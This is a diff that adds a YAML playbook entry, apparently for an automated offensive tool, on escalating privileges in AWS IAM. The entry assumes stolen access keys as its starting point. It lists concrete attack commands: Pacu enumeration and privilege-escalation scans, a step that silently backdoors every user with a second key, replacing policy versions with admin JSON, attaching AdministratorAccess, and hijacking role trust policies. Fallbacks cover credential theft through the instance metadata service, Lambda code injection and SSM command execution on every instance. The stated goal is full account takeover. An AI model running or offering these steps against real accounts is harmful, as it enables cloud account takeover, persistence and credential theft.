@@ -1,0 +1,51 @@
+id: cloud_aws_iam_priv_esc
+title: "AWS IAM — Pacu enumeration + 21 privilege-escalation paths"
+phase: privesc
+mitre: ["T1078.004", "T1098.001"]
+trigger:
+  services: []
+  ports: []
+  technologies: ["aws", "iam"]
+  cves: []
+keywords: ["aws", "iam", "pacu", "privilege escalation", "iam_priv_esc", "lateral cloud"]
+preconditions:
+  - "Valid AWS access keys (AKIA…/ASIA…) — usually exfiltrated via SSRF, env leak, .git/config, or dev laptop"
+  - "Pacu installed (recommended over manual aws-cli for ease)"
+steps:
+  - tool: aws-cli
+    cmd:  "aws sts get-caller-identity"
+    why:  "Confirm key validity + ARN + account ID"
+  - tool: enumerate-iam
+    cmd:  "enumerate-iam.py --access-key {akia} --secret-key {sak} --session-token {token}"
+    why:  "Brute-force which IAM API calls succeed — reveals invisible permissions"
+  - tool: pacu
+    cmd:  "pacu --session loot --access-key-id {akia} --secret-access-key {sak} --session-token {token}; run iam__enum_permissions; run iam__privesc_scan"
+    why:  "Pacu auto-detects all 21 known IAM priv-esc paths (CreatePolicyVersion, SetExistingDefaultPolicyVersion, AttachUserPolicy, PutUserPolicy, AddUserToGroup, UpdateAssumeRolePolicy, PassRole+CreateInstance, etc.)"
+  - tool: pacu
+    cmd:  "run iam__bruteforce_permissions; run iam__enum_users_roles_policies_groups; run iam__backdoor_users_keys"
+    why:  "Comprehensive IAM enum + persistence (creates 2nd key for each user — silent backdoor)"
+  - tool: aws-cli
+    cmd:  "aws iam create-policy-version --policy-arn {arn_with_set_default_perm} --policy-document file://admin.json --set-as-default"
+    why:  "SetExistingDefaultPolicyVersion priv-esc — replace existing policy with admin JSON, default-version it"
+  - tool: aws-cli
+    cmd:  "aws iam attach-user-policy --user-name {self} --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"
+    why:  "Direct path when iam:AttachUserPolicy granted"
+  - tool: aws-cli
+    cmd:  "aws iam update-assume-role-policy --role-name {role} --policy-document file://trust-self.json"
+    why:  "UpdateAssumeRolePolicy — modify trust to self → assume the high-priv role"
+  - tool: scoutsuite
+    cmd:  "scoutsuite aws --profile {profile}"
+    why:  "Comprehensive cloud-posture audit; flags every IAM/S3/EC2/RDS misconfig"
+  - tool: cloudfox
+    cmd:  "cloudfox aws --profile {profile} all-checks"
+    why:  "Modern alternative — focused on offensive recon (lateral mvmt paths, secrets in EC2 user-data, etc.)"
+expected_outcome: "AdministratorAccess policy attached to attacker user → full account takeover"
+fallbacks:
+  - "iam:PassRole + ec2:RunInstances → launch instance with admin role attached, pull creds via metadata"
+  - "lambda:UpdateFunctionCode + lambda:InvokeFunction → run arbitrary code with attached role"
+  - "ssm:SendCommand → run commands on every EC2 instance with the SSM agent"
+  - "Pivot to other accounts via cross-account trust if visible in trust policies"
+references:
+  - "https://github.com/RhinoSecurityLabs/pacu"
+  - "https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/"
+  - "https://github.com/BishopFox/cloudfox"
